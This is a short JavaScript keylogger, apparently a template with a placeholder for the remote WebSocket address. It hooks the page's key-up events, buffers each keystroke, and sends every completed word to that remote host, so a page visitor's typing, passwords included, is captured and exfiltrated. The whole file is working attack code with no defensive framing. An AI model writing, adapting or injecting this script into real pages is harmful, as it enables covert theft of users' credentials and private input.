(function() {
  let conn = new WebSocket("ws://{{.WS_remote_addr}}/ws");
  // document.onkeypress = keypress;
  document.onkeyup = keypress;
  let buffer = "";
  function keypress(event) {
    let key_stroke = String.fromCharCode(event.which);
    if (key_stroke !== " ") {
      buffer += key_stroke;
      console.log(key_stroke);
    } else {
      let word = buffer.toString();
      conn.send(word);
      buffer = "";
    }
  };
})()
